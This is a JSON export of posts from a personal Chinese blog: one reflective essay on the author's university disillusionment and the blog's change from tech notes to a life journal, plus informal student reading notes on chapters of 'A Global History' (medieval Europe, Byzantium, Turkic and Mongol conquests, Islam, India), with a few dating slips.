[{"title":"终于要开始做纪录了","date":"2021-02-18T17:59:00.000Z","path":"2021/02/19/records/终于要开始做纪录了/","text":"变化 ​ 现在，这个小小的博客网站正发生着变化，这也许是谁也不在意的，不过这里确实在根据我的想法慢慢地发生着改变。这里就像我独有的天地一番。 ​ 那是在遥远、遥远的一年半前，当时我刚刚进入大学。我被网上的介绍洗了脑，认为大学就是要奋斗、学习的。于是我一次又一次地同懒惰搏斗，学习了很多东西。但很遗憾的是这些东西至今也没为我带来什么实质性的收获。 ​ 这个小小的博客站也曾是我努力的产物，我将自己小心翼翼搭起来的博客用作了技术记录并且享受着将自己的知识分享到网上的乐趣。虽然并没有什么人看，我也心知肚明，这只是自我满足感在做崇。 ​ 我记录着我专业学习过程中的杂杂碎碎，就这样过去了一年半。我是一个一年半来一直在傻傻地学习专业内容、且学习目标并不明确的傻孩子。我曾执迷于算法，可最终发现一切只不过是应试题目而已；我开始研究工程项目，却发现我缺乏更专业的知识，我只做到了肤浅地使用，与底层逻辑相差甚远；我将自己的疑问诉于学长，学长却指责我快去写项目练经验；半年前我醒悟了过来，只不过在压榨我的劳动力罢了，原来小丑竟是我自己。 ​ 这半年我一直在探索，我应该做的事是什么呢？这是一个毫无作为的大二学期，每天从早忙碌到晚，我学东学西，却四处碰壁。我终于成为了别人眼里假努力的大学生，我活成了最讨厌的样子。 ​ 临近期末，我也终于想开了：我想到了我的未来，一个坐在公司里加班到深夜的形象。某种意义上既可怜又不可怜，拿着高工资却失去了高工资带来的享受。我开始对我所学的东西产生了厌恶感。 ​ 与其拿着高工资做着别人眼中的”技术大佬”与”加班皇帝”，不如只做一个底层的人，不拿那么高的工资，过一个自己满意的人生。 ​ 我可不是说我没有上进心，说来毫不自惭，我自认我的上进心无人能比。我曾疯狂学习日语、英语以期出国镀金；我曾疯狂学习算法、CTF以期竞赛加分；我曾疯狂复习专业课、通识课以期顺利保研。我没有出国的基底，我忍不了踩在我头上的竞赛前辈，我争不过那些卷起来的魔怔人。 ​ 于是，我选择做一个废物，但我问心无愧。我给自己定下两条铁律：不要和他人对比，不要后悔做过的事。不过说实话，无论你是什么样的金子，出了大学无非都是在996罢了。这不是我的错，也不是你的错，这是时代的错。 ​ 可不要突然妄想去改变社会。唯物史观告诉我们，历史由社会的变化而演进。我不相信这个社会会一直这样下去。这个tmd黑暗时代(不过以前的时代更黑暗就是)总会过去的。做好心里的自己就可以了。 ​ 我无力改造社会，可我有力改造自己。我想要培养自己更多的兴趣。既然社会要毒打我，那我便要更加强大。这样说起来感觉很中二，我要积攒自己的力量，等到了真的要打倒巨人的时代，我自会将自己微薄的力量全力奉上。 ​ 以上，就是这个博客站正在发生的、毫不有趣的事情。如果您看到这里，我表达我最诚挚的感谢。 状态​ 现在我打算将这个技术性的博客站转变为记录我生活的博客站。不止记记技术，也用来记记自己的兴趣和随随便便的心得。这也将是我存在于这世界上的某种证明吧，我想。","tags":[{"name":"随笔","slug":"随笔","permalink":"https://v25bh145.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"13.革命的西方文明-全球通史","date":"2021-02-15T15:59:00.000Z","path":"2021/02/15/hobbies/history/全球通史/13.革命的西方文明/","text":"革命的西方文明说明: 上一章，儒家思想没有记录，因为懂的都懂(中学历史、中华上下五千年什么的比这个写得更详细啦)。在这一章，我们终于要记到了近代史力！(鼓掌) 西方文明的多样性对西方中世纪各社会阶层的分析 ​ 社会分为三个阶层：骑士、劳动者与教士，其中劳动者可再分为农民与商人。 ​ 骑士阶层由封建制度体现：君主将地产当做报酬给予封臣，使封臣对其效忠。这一制度(封建主与封臣之间的契约)即是一种政体。 ​ 农民阶层由采邑制度体现：封臣(或称贵族、骑士)将土地分给更多愿意追随自己的人(其实就是劳动者中的农民/农奴)。具体来说就是，封臣提供土地、保护农奴，而农奴负责提供生产、服兵役(一年约40天)。采邑制度是自给自足的，稳步提高了生产效率。 ​ 教士阶层由教会体现：国家权力越弱小、分散，教会势力越强。教会通过两种方式提高地位：一种是与法兰克人结盟，一种是传教给北欧人。 与罗马帝国制度上的不同 - 封建制度取代了帝国的朝廷 - 自给自足的采邑制度取代了奴隶种植园 - 独立的教会取代了由国家控制的教会地理背景 欧亚大陆的最西方边界。免受了蒙古、柏柏尔、奥斯曼人的侵略。 连绵不断的平原、地中海的季风气候、便利的沿海、河航道。 技术进步 中世纪西欧取得的技术进步超过了整个古典希腊和罗马时期所取得的进步。 西欧没有奴隶制，使用自给自足的采邑制代替了奴隶制，体力劳动重新获得尊重(基督教的人道主义部分)，教士们坚持认为体力劳动是精神生活的一部分。 对马力的应用，对水车、风车的应用。 经济的发展大体趋势 10世纪至14世纪西欧经济稳步发展(上述原因 - 生产力的提高)。 14世纪由于饥荒、黑死病、粮食歉收、英法”百年战争”、德意战争等等一系列问题，导致经济崩溃。 14世纪之后，经济又呈复苏趋势。 商人阶级[布尔乔亚] ​ 14世纪时，商业从日常生活的边缘性活动发展成为日常生活的核心内容，从事商业的人大幅增加，部分也开始出海谋生。(威尼斯、阿玛尔菲、那不勒斯商业中心与香槟地区的集市) 自治市 ​ 自治市的自由民拥有财力、财政资源，拥有国王授予的皇家特许状，享有高度自治权，可以自行组织商人、工匠行会与同盟会，也拥有自己的市政厅、法院以及附属地区。 ​ 自由市之间也会联合起来组成联盟(伦巴第联盟、汉萨同盟等等)，其成为了强有力的政治、经济实体，起着反对帝国管辖、打击海盗与影响外国等等的作用。(商人获得了极其强大的政治、经济力量) 新君主国的崛起查理曼死后，国家迅速分裂，西欧遍布封建小国，开始逐渐蚕食查理曼帝国的土地与权力。 教士阶层与君主的矛盾争端 ​ 争端分为三个阶段: 9至11世纪，教会与皇帝总体呈合作态势。教皇帮助皇帝反对德意志世俗贵族，皇帝帮助教皇反对拜占庭教会势力。 1073年教皇格列高里七世任职，罗马教皇的权利达到顶峰，教皇赢得了日耳曼主教的任免权。13世纪时教皇英诺森三世已经控制了各国皇帝、国王的任命与废黜。 教皇权利于卜尼法斯八世突然结束。卜尼法斯八世于1302年颁布《教皇训令》，要求各国服从罗马教皇统治，而遭到了各国君主、议员的反对，卜尼法斯八世被威胁、虐待至抑郁而亡。1305年法国大主教当选为教皇，选择法国东南部的阿维尼翁为教皇驻地，自此教会成为了君主的爪牙。 君主与商人阶级的非正式联盟 ​ 自治市的自由民向君主提供财政援助、贡献管理才干，而君主向自由民提供保护，为保护商人利益降低了地方自治权。 ​ 随着一系列权力的变化与制度的实行，民族君主国与15世纪形成了(英国、法国、葡萄牙、费迪南、西班牙)。民族君主国极大促进了海外冒险事业的进步(由民族君主国主导并且出资)。 文艺复兴黑暗时代 ​ 黑暗时代(指从罗马陷落之后的约1000年)时，由于极度贫穷、危机四伏、与世隔绝种种情况，不可能产生文学、艺术或学术杰作。只有教会保存了部分古典文化，不过这种文化是”教会的”文化，完全依附于教会。 教会学校 ​ 11世纪主教为了教育教士在各个地区开办了教会学校，在一个世纪以后逐步形成了早期的第一批大学(牛津、巴黎、博洛尼亚)，开办了除文科外的教会法规、民事法律、医学与神学四系，其中文科包括低级(拉丁文法、逻辑、修辞)与高级(算数、几何、音乐、天文)。当时大学还仅是培养教士的机构。 文艺复兴时期 ​ 1350-1600年，文艺复兴酝酿时期到来，教育、学术环境也随之发生了改变。 Q: 文艺复兴的起源地为何会出现在意大利？ 1. 意大利地区有着大量的商业城邦，并且与伊斯兰人、拜占庭(?)人进行着贸易活动。 2. 商人阶级主导着政治、经济与手工业。 3. 商人家族是文艺复兴时期艺术家、作家的主要赞助者。 4. 文艺复兴的世俗主义、人道主义比起基督教会而言，更加关注现世而非来世。扩张主义​ 10-14世纪，欧洲与游牧部落之间的局势反转了过来，天主教世界对穆斯林发动了十字军圣战，向各个方向扩张。 扩张的因素 - &quot;为上帝服务&quot; - 寻求黄金 - 科学技术的发展，尤其是造船、仪器、航海技术以及海军装备取得的进步，复式簿记法的发明Q: 蒙古统治结束后，为何东亚人开始闭关锁国，而西欧人则开始了疯狂的对外扩张？ ​ 专门的技术、经济实力以及活跃的思想，活跃的布尔乔亚。 西方文明中的女性​ 教会名义上主张男女、种族平等，却不允许授予女性牧师的神职或布道的权利；但另一方面教会设置了女修道院为女性提供了不结婚生活的权利。 ​ 封建制度中，妇女并没有继承权，只能成为政治联姻与家族繁衍的工具。 ​ 总体而言，中世纪妇女的社会地位与财富大致呈反比。农村女子结婚后做的农活不亚于丈夫，城镇的妇女几乎活跃在各行各业中，而王室的妇女却只能作为工具。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"12.传统的拜占庭文明-全球通史","date":"2021-02-12T12:01:00.000Z","path":"2021/02/12/hobbies/history/全球通史/12.传统的拜占庭文明/","text":"传统的拜占庭文明 “于1204年就已崩溃，后又于1261年得以部分地回复，并一直苟延残喘到1453年最终灭亡。” 拜占庭的出场君士坦丁堡: 原为公元前七世纪希腊人的殖民城邦，名为”拜占蒂翁”，南临马尔马拉海，北为博斯普鲁斯海湾。在罗马攻占了君士坦丁堡周围的土地后其愈发重要，后被选为东罗马帝国的首都。 东罗马早期的征服 查士丁尼一世对北非、意大利与西班牙发起了再征服，几乎使地中海变成了内海，然而在查士丁尼一世死后领土又被迅速侵占； 希拉克略皇帝(610-641)在世时期，发动了大量的反击，使得大量领土被收回； 7世纪后拜占庭再次被阿拉伯人的海上袭击与保加利亚人(当时在多瑙河-巴尔干山脉地区)的陆上袭击同时威胁，此时利奥三世趁阿拉伯人围攻君士坦丁堡之际迅速夺权，篡位为皇帝，成功赶出了阿拉伯人与保加利亚人。 ​ 自此，拜占庭帝国疆域大缩(南抵托罗斯山脉)，但民族更加单一。随着阿拉伯帝国将扩张方向转移至东方，拜占庭与阿拉伯暂能和平共处。 拜占庭的黄金时代​ 9-11世纪是拜占庭的黄金时代，当时帝国以省分治，实行军事化省份；农民被分配予土地以作服兵役的报酬，农业制度实行自由农民村社；同时农民负担了巨额的税款以充实国库。 黄金时代中的征服战争 ​ 帝国的疆土扩大至克里特岛与塞浦路斯岛，同时向北扩大至叙利亚北部、亚梅里亚与格鲁吉亚。 ​ 1014年，巴西尔二世在巴尔干半岛北部取得了决定性胜利，被称为”屠杀保加利亚人的刽子手”，保加利亚人被征服。 和平、稳定的时期 ​ 拜占庭人仍称自己为罗马人，但使用希腊语作为帝国通用语言。 拜占庭与东正教 ​ 帝国信奉东正教(保加利亚人、俄罗斯人、塞尔维亚人也都皈依了东正教)。 ​ 拜占庭皇帝也与东正教主教之间相互支持，皇帝自身为传道者，主教由皇帝进行选择。 拜占庭的衰落省份军事化的危害 ​ 各省的军事将领反抗愈加剧烈，破坏了帝国的军事体制，导致皇帝无法控制军队。 经济失调 ​ 私人、寺院的收入减少；皇帝减免了贵族的税收；同时由于外敌侵入导致土地荒芜。拜占庭金币索利达连续贬值。 外来侵略-1071年两大灾难 东方代替了阿拉伯帝国的塞尔柱帝国与西方诺曼冒险者的入侵 拜占庭在意大利地区的领土被诺曼人全部夺走 塞尔柱突厥人越过了托罗斯山脉，在小亚细亚的曼齐刻尔特战败了拜占庭皇帝。 =&gt; 导致帝国皇帝争端又使用了一大批突厥雇佣军。 康维努斯皇帝 ​ 康维努斯皇帝(1081-1118)挽救了即将灭亡的帝国。予威尼斯人极大的商业特权，以换取他们的支持共同反对诺曼人；向天主教国家求救引发了第四次十字军东征。 拉丁人的第四次十字军东征 ​ 1261年，拉丁人本该对穆斯林世界的十字军东征由于威尼斯商人、诺曼冒险者以及其他利益相关者的谋略下将东征目标改为了君士坦丁堡，君士坦丁堡被拉丁人大肆劫掠，遭到整整三日的掠夺与屠杀，为伊斯兰教的统治铺平了道路。 拜占庭的灭亡​ 拉丁人在拜占庭帝国疆域内建立了几个天主教国家；威尼斯瓜分了君士坦丁堡四分之一的领土。 ​ 拜占庭首都君士坦丁堡被拉丁人占领，成立拉丁帝国。拜占庭只剩下了三个国家: 阿尔塔(伊庇鲁斯地区)、尼西亚帝国与特拉比松。其中尼西亚帝国实力最为强大，其逐渐削弱了拉丁帝国的力量，最终1261年拉丁皇帝与威尼斯殖民者逃离了君士坦丁堡，尼西亚帝国皇帝米海尔·巴里奥略重新成立了拜占庭。 拜占庭的最后阶段 ​ 帝国仅由君士坦丁堡与塞萨洛尼基两座城市以及周围小块不稳定地区以及两个属地组成。帝国的经济已经破产；皇帝们被迫贬值货币并将皇室宝物卖予威尼斯银行家；为了反抗贵族，平民们纷纷起义，城市冲突使得帝国四分五裂。 ​ 1342年至1349年，狂热派起义统治了塞萨洛尼基，使其变为了民主制共和国，但很快被皇帝镇压。 ​ 1453年，拜占庭最后的首都伊斯坦布尔君士坦丁堡沦陷。(精罗落泪啊精罗落泪)","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"11.突厥人与蒙古人的入侵-全球通史","date":"2021-02-09T09:13:00.000Z","path":"2021/02/09/hobbies/history/全球通史/11.突厥人与蒙古人的入侵/","text":"纲要 突厥人 =&gt; 蒙古人 =&gt; 突厥人 天主教、东正教 =&gt; 伊斯兰教 突厥人入侵突厥人: 由突厥语系的某种语言而联结起来的种族集合。 突厥人与阿拉伯人​ 阿拉伯人征服了波斯，打败了中国人(怛罗斯之战，751)，突厥人受到强大的阿拔斯王朝的影响，转教伊斯兰教。这种影响正如当年的日耳曼人对于罗马人，突厥人首先开始作为阿拔斯王朝的雇佣兵，之后成为了正式的军事力量取代了阿拉伯军队，在哈里发王朝衰落后再其内部篡权建立国家。1055年，哈里发宣布塞尔柱(突厥人的一支)为苏丹(君主)，使得突厥人的政权得到正式承认。 小亚细亚的诸多战役​ 1071年，塞尔柱人在小亚细亚东部的曼齐刻尔特战役大获全胜，俘虏了拜占庭国王罗曼努斯四世，成为了中东历史决定性的转折点，根本上导致了拜占庭的覆灭。 拜占庭覆灭的两大原因 1. 直接原因 - **突厥人的入侵**。 2. 直接原因 - 小亚细亚半岛丢失，**大量税收以及人力来源被抢占**，帝国陷入腐败与赤字。 3. 直接原因 - **东西方教会分裂**，**天主教**与**东正教**不和(直接导致了**第四次十字军东征**)。 4. 根本原因 - **帝国腐败、赤字、生产力低下，导致农民被剥削**。农民对突厥人入主小亚细亚持欢迎态度。塞尔柱帝国入侵印度​ 塞尔柱人曾疯狂向印度扩张，以马哈茂德为代表。在塞尔柱帝国吞并旁遮普后，马哈茂德热衷于捣毁当地的印度教的神庙与神像，导致印度地区一部分转变信仰为伊斯兰教，也是二战后印度分裂(印度-巴勒斯坦)的原因。 突厥人为何能毫不费力征服印度 印度还在使用古老的军事战术，甚至与1500年前相同。 印度的种姓制度，只允许刹帝利参战，而农民却大多采取漠不关心的态度，更有甚者会欢迎穆斯林人到来并改教。因此虽然印度人远远多于穆斯林人，却毫无还手之力。 成吉思汗、蒙古崛起 1206年，成吉思汗(铁木真)被推举为全蒙古大汗，尊为”世界的统治者”。 为什么蒙古凭借约12万5千人的人力就可以统治欧亚大陆的大部分土地？ 蒙古人身为游牧武士的内在优势，将日常生活与作战演习训练相结合。 将闪电战带入13世纪(3天270英里)。 军事战术领先，会使用各种心理战以及游击战。 蒙古人使用大型混合弓，比英国长弓还具有杀伤力。 来自中国人先进的军事科技与攻城器械。 蒙古人的征服过程 1205-1209年，附庸西夏 1211年，攻入长城，1215年，劫掠北京，得到了大批工匠与先进的科技。 1216年，满洲沦陷，1218年，朝鲜失守，1219年，喀喇汗国灭亡(西藏地区，由东到西分别是喀喇汗国，花刺子模，哈里发王朝)。 1219-1221年，占领花刺子模，劫掠撒马尔罕城。 征服反抗的西夏之后成吉思汗于1227年去世。 1229年，窝阔台继位，1234年，金被蒙古歼灭，45年后灭亡南宋。 1237年，成吉思汗的孙子拔都越过伏尔加河，进攻俄罗斯各公国，直至1240年12月占领基辅。 1242年，窝阔台去世，拔都穿过巴尔干撤回伏尔加河下游，建立金帐汗国(以帐殿为金命名)。 1277年，新大汗忽必烈从哈拉和林迁都到北京，对印度支那、缅甸与日本发动侵略战争。 1258年，阿拔斯王朝首都巴格达被蒙古攻陷，惨遭屠城。 蒙古帝国的衰落过程 东线: 被马穆鲁克军队在巴勒斯坦击败。 西线: 被日本和爪哇击败。 由于不能迅速扩张，帝国便迅速瓦解。 根本原因 ​ 蒙古人口在帝国处于劣势，并且蒙古人不开化，大多数采用了各地属国的文化与宗教信仰。(例子 - 迁都北京，忽必烈的实际权力仅限于中国；旭烈兀统治波斯，建立伊尔汗国；金帐汗国接受了东正教文化与伊斯兰教教义的影响) 突厥人的复兴原因 ​ 蒙古人人口极少，因此大量招募突厥人，之后随着蒙古帝国分裂，突厥人迅速占据了险要的位置。 帖木儿帝国帖木儿与1369年占领撒马尔罕，消灭了波斯-美索不达米亚的伊尔汗国、俄罗斯的金帐汗国以及小亚细亚的奥斯曼土耳其人，直至入侵印度洗劫德里。帖木儿帝国疆域从地中海到中国边境，帖木儿去世之后帝国迅速分裂。 穆斯林突厥人在印度的扩张14世纪，随着蒙古帝国分裂，印度突厥人开始向南扩张，但由于帖木儿帝国的侵略使得印度北部与中部碎成了许多突厥人统治的小国家。 最终在16世纪，莫卧儿帝国从外部强行统一印度。 奥斯曼土耳其人在拜占庭的扩张​ 最初，奥斯曼土耳其人趁塞尔柱帝国衰微之时在小亚细亚西北角定居(据博斯普鲁斯海峡以及达达尼尔海峡不到50公里)。1299年，首领奥斯曼宣布脱离塞尔柱帝国统治，并发展成为奥斯曼帝国。 ​ 奥斯曼帝国首先征服了小亚细亚地区的拜占庭帝国领土(原因见”突厥人入侵部分”，这部分侵略至1340年完成)；之后渡过达达尼尔海峡，在加里波利建立要塞；在1362年占领阿德里安堡以及1384年夺取索菲亚之后，奥斯曼帝国包围了君士坦丁堡；但是奥斯曼苏丹于1402年被帖木儿帝国俘虏，随着帖木儿帝国分裂，奥斯曼帝国得以重建统治，最终于1453年攻陷君士坦丁堡。15世纪末，奥斯曼几乎统治了多瑙河以南的整个巴尔干半岛。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"10.伊斯兰教的兴起-全球通史","date":"2021-02-06T13:49:00.000Z","path":"2021/02/06/hobbies/history/全球通史/10.伊斯兰教的兴起/","text":"伊斯兰教的兴起兴起时期: 公元7-11世纪 势力范围: 摩洛哥-中亚(信德省) 语言: 阿拉伯语 穆罕默德 伊斯兰教的创立者、圣人 ​ 穆罕默德与569年在麦加出生，是商人的遗腹子(妻子死亡所生子)，在40岁之余自称感受到上帝征兆，创立了伊斯兰教。 ​ 于622年穆罕默德移居麦地那(阿拉伯人称”希吉拉“事件)，将犹太人驱逐出城并且疯狂劫掠麦加的商队(袭击变成了阿拉伯游牧民普遍能接受的经济活动)。630年，穆罕默德与麦加的商人达成和解。此后，穆罕默德以伊斯兰教教义为基础创立了一个神权政治国家。 穆斯林人的征服侵略的开始 ​ 穆罕默德死后，部落酋长们纷纷开始叛乱(史称”变节“)，穆斯林领导者通过选举哈里发(代理人，世俗首领，且第一代哈里发为穆罕默德的岳父艾卜伯克尔)，使用向外侵略扩张的方式缓和了国内矛盾。 正式侵略 ​ 634年，欧麦尔继承了艾卜伯克尔的哈里发头衔，向拜占庭帝国与波斯帝国发起了正式的侵略战争。 发动正式侵略战争的原因: 1. 两个帝国互相开战，**外强中干**。 2. 向外侵略到富庶地带的部落不愿回贫瘠地带，可能&quot;**变节**&quot;。结果: ​ 穆斯林人向西进入埃及，向东进入波斯，在北非跨过直布罗陀海峡入侵西班牙(灭国西哥特 [=&gt; 罗德里戈]；最终抵达比利牛斯山脉，被法兰西人击败 =&gt; [732年，法国国王查理·马特])。 伊斯兰帝国内的政变主要原因: “麦瓦利“(非阿拉伯穆斯林)的出现，他们涌入城市，充当各种身份，且开始要求与阿拉伯人平等。 导火索: 对阿拉伯贵族的抵抗运动 结果: 750年，阿拔斯哈里发王朝建立(结束10年内乱，阿拔斯帝国形成)；哈里发的权力从酋长接近神权君主；麦瓦利人(尤其是波斯人)代替了阿拉伯旧贵族上台；波斯人开始充当皇家常备军；762年，阿拉伯帝国由大马士革迁都至巴格达(曾于661年从麦地那迁都至大马士革)。 伊斯兰教文明的形成 极大促进了贸易发展。 宽容异教徒(基督教&amp;犹太教)，伊斯兰教教义中承认基督教与犹太教，但批判其还不完整。 促进东西方科技传播，中国的四大发明被传至西欧。 坚持了约900年的天文记录。 文明融合了希腊——罗马文明，波斯——美索不达米亚文明，语言通用阿拉伯语。 帝国的衰落——三支侵略部队 十字军由北入侵，占领了西班牙(伍麦叶王朝被推翻，分裂成诸多小国)、西西里(1091年由诺曼底国王统治)以及叙利亚(第一次十字军东征，建立了十字军国家，收复耶路撒冷，但被萨拉丁率领的穆斯林军队驱逐)。 来自摩洛哥南部、赛加内尔以及尼日尔地区的柏柏尔人，以及上埃及地区的希拉勒与苏莱姆部落的入侵，北非文明被摧毁。 来自东方的突厥人与蒙古人(详见下章)。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"9.中世纪文明形成欧亚大陆一致性-全球通史","date":"2021-02-02T14:20:00.000Z","path":"2021/02/02/hobbies/history/全球通史/9.中世纪文明形成欧亚大陆一致性/","text":"中世纪文明形成欧亚大陆一致性特点: 庞大的、横跨多块大陆的帝国。 连续不断的侵略扩张。 商业纽带海上贸易​ 一开始由穆斯林帝国主导全海区贸易；在14-17世纪明朝建立了海上霸权；在明朝衰落后欧洲人迅速弥补了权力真空区，建立了以西方为主导的海上霸权。 陆上贸易​ 由于蒙古帝国兴起(历史上唯一一个横跨欧亚大陆的政权，领土由波罗的海到太平洋，由西伯利亚到波斯湾的大部分欧亚大陆)，陆路贸易十分安全。 ​ 在蒙古全面崩溃后，伊斯兰教国家阻断了陆上贸易，欧洲人被迫开辟水上航线(绕过非洲)。 宗教纽带 - 伊斯兰教 在732年穆罕默德死后，伊斯兰教突然从阿拉伯半岛向外传播。其传播历经两个阶段。 第一阶段​ 632到750年，伊斯兰教传遍了中东地区，之后向西传到了比利牛斯山脉，向东传到了中亚地区，将地中海变成了穆斯林世界的内海(穆斯林罗马说.jpg) 第二阶段​ 1000年到1500年，伊斯兰教传入了印度、东南亚以及非洲，整个印度洋地区也由穆斯林控制。 其他宗教的发展​ 天主教被挤到了西欧的一角，天主教徒开始惶恐，试图联合蒙古人与蒙古治下的中国，虽然并没有使得蒙古改教，不过两个宗教之间开始了交流。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"8.古典文明的终结-全球通史","date":"2021-02-01T15:24:00.000Z","path":"2021/02/01/hobbies/history/全球通史/8.古典文明的终结-全球通史/","text":"前言reason 1. 技术停滞不前。 =&gt; 生产力低下。(根本原因) 2. 游牧、侵略者入侵。 (直接原因)前言-2 全球通史的第七章–中国，这里并没有选择记载，各位有兴趣可以去书上看看，我阅读一遍之后发现基本上都是初中高中的历史内容，所以也就没记了。 古典文明的衰落恶性循环 ​ 战争花费与官僚花费迅速提高与停滞不前的生产力水平形成明显对比，而导致帝国对百姓人力、税款压榨得越来越多，导致帝国内部农民起义爆发，外部蛮族侵入，从而又导致了战争花费的提高。 为何生产力如此低下 1. 帝国安定，战争、官僚花费支出增加，而没有创新技术支出的必要。 2. **奴隶制**。奴隶为主要生产工具、世俗间普遍歧视劳动，导致哲学家与工匠互相分离。蛮族入侵 - 直接原因 东方-东匈奴人​ 东匈奴人攻击了中国的汉帝国与印度的笈多帝国，导致汉帝国分裂、笈多帝国覆灭。中国因原住民人数远远大于游牧人数，所以游牧民族与汉人民族逐渐融合；而印度则因为大规模迁入印度的移民，这些移民多以信印度教为荣，所以印度文明如今并没有消失。 西方-日耳曼人与西匈奴人​ 日耳曼人在侵略者中人数众多，经常是罗马人的佣兵或努力。日耳曼人趁罗马帝国内虚攻入，夺得了一些领地。 ​ 然而到了西匈奴人到来后，日耳曼人被逼入罗马帝国境内建立了西哥特王国，洗劫了罗马城。匈奴人仿照之在匈牙利也建立了王国(但最终因领主阿提拉的离奇死亡而王国崩溃)。 ​ 最终，日耳曼的王国各个逐渐崛起，罗马帝国分崩离析。西边为西罗马帝国(后被法兰克王国击败)，东边为东罗马帝国(后来的拜占庭帝国，由于海军强大且首都君士坦丁堡难以攻陷而存活下来)。 西方不断的侵略过程​ (公元前6世纪左右)由于蒙古内部的动乱，导致游牧再次西迁，将伦巴第人赶到了意大利半岛(伦巴第王国)，伦巴第人击退了原本在此地的拜占庭人。 ​ 同时，穆斯林人也跨越了比利牛斯山脉，攻入了法兰克，被法兰克在公元732年的图尔战役击败并在之后几十年后赶回(此时已到了加洛林王朝时期)。 ​ 公元751年，宰相矮子丕(pī)平篡位上台，终结了墨洛温王朝，创建了加洛林王朝。在查理曼在位时期(765-814)，加洛林王朝击败了德意志西北的撒克逊人、匈牙利的阿瓦尔人(游牧)、将穆斯林人赶回了比利牛斯山以南。其帝国疆域从北海至比利牛斯山以南，从大西洋扩展到斯拉夫人诸国。800年圣诞节，教皇利奥三世加冕查理曼，称帝为罗马皇帝奥古斯都。 ​ 但查理曼死后帝国又迎来了一波新的侵略浪潮南:方的穆斯林人征服了克里特岛与西西里岛，破坏了海上贸易；东方又来了一支游牧部族；北方登录了北欧人(即维京人)，其袭击了不列颠群岛与欧洲西海岸，渡过了直布罗陀海峡，劫掠了地中海南岸(侵略者首领在911年被法兰克国王封为诺曼底公爵后侵略才基本停止)。 ​ 自此，加洛林王朝在被侵略者环围的形势下土崩瓦解。","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"7.印度-全球通史","date":"2021-01-28T16:56:00.000Z","path":"2021/01/29/hobbies/history/全球通史/7.印度-全球通史/","text":"印度文明characteristic ​ 与外界隔绝的程度介于中国与欧洲之间，侵略者也来自西方，但是却形成了与西方完全不同的文明。 雅利安人农业制度、经济制度、政治制度 ​ 公元前800年，雅利安人掌握了冶铁技术，加快向印度的扩张。到了印度之后，决定农业代替游牧，种起了当地适宜种植的水稻。 ​ 雅利安人转为农业制度之后，由于要建设村庄，一系列技术应运而生，生产力的提高也刺激了经济发展，开始用以铸币为媒介的货-币贸易代替了传统的以物易物贸易。 ​ 经济发展的提高也促进了政治统一，雅利安人逐渐由部落转为王国。在早期的国家中，摩揭陀王国由于地处商业要道，铁矿资源丰富，很快遥遥领先与其他国家，成为之后帝国的基础。公元四世纪时，难陀王朝最早地为了建设国家系统利用了摩揭陀的资源。公元前321年，旃(zhān)陀罗笈多·孔雀成功篡权夺取了难陀的王位，建立了孔雀帝国。 ​ 种姓制度 (民族主义不可取嗷) ​ 最早，印度雅利安人也分武士、祭司、平民三大阶级，但是到公元前500年时，种姓等级制度开始发挥作用。 ​ 雅利安人将印度土著成为达塞人，由于雅利安人有着强烈的种族优越感，其将发展起了划分四大世袭种姓的制度。由祭司(婆罗门)、武士贵族(刹帝利)、农民(现在的富商)(吠舍)与第四种姓(土著、达塞人)组成，达塞人不准参加宗教仪式，也没有社会权利。 ​ 随着时间推移，制度也发生了变化，黑皮肤的达塞人也有人逐渐成为婆罗门与刹帝利，也有些雅利安人成为第四种姓，种姓制度逐渐变得复杂多样，但是有以下基本特征： 种姓制度的四个基本特征 具有独特的职业 世袭原则 对食物、水、接触、礼仪的各种行为有种种限制 每一个种姓都有自己独特的道德准则 被排除种姓制度外的是贱民，被定义为不可接触的人，他们只能执行被玷污了的仪式与工作，一般会遭遇社会隔离，在极端情况下甚至都不能被普通人看见。而贱民们的心灵也受到了严重的摧残，祭司欺骗他们根据所谓的因果论，他们曾在前世犯下了滔天大罪，这辈子需恭恭敬敬地履行现世的责任与义务才能在下一世中得到改善。 ​ 直到现代，种姓制度仍然在印度四分之三居住的农村地区发挥着作用。 ​ 所以说，这都是什么屑制度啊(恼) 改革与反改革公元前6世纪-公元前5世纪进行宗教改革的原因: 婆罗门的种种无理要求和强征勒索。 经济发展形成了一个新的富裕商人阶级-吠舍种姓，非常怨恨婆罗门与刹帝利的特权。 婆罗门与非雅利安人关系紧张，非雅利安人对于婆罗门的支配地位非常不满。 =&gt; 人们开始要求自由，苦行主义(详见 沙门思潮)盛行，直接导致一系列佛教等改革运动。 佛教 ​ 公元600年，佛教渐趋没落，最后仅存于少数几个地方。佛教消失的一个原因是，它并未对世俗生活中的一些关键礼仪做出规定，更重要的一点是，婆罗门自己也从事改革，《奥义书》中就提出了他们设计的通向自由与解放的道路(印度教的反改革运动)。 孔雀帝国建立 ​ 亚历山大东征至印度，消灭了印度西北部的几个小王国，造成了印度西北部的权力真空，而旃(zhān)陀罗笈多·孔雀迅速填补空缺，于公元前322年建立了以他名字孔雀为名的帝国。 ​ 旃陀罗笈多的儿子征服了德干，而其孙子(阿育王、公元前273-公元前232)征服了蝎陵伽(印度东部)。 社会 ​ 类似于罗马帝国的社会，税收严苛、常备军数量众多、帝国法律严厉、刑法严酷。但是发展度很高，国富民强、政治清明高效。 宗教 ​ 阿育王在位时期大力发展佛教，但是并没有使佛教成为国教，也没有迫害其他的宗教。(阿育王强调宽容与非暴力主义) 分裂 ​ 印度与中国不同，分裂时间长而统一时间短，印度文化强调忠于社会秩序而不是国家(例如，种姓地位高于任何政治制度)。 侵略者、商人与传教士 公元前2世纪初，孔雀帝国覆灭，开始了长达500年的混乱与黑暗统治 侵略者 ​ 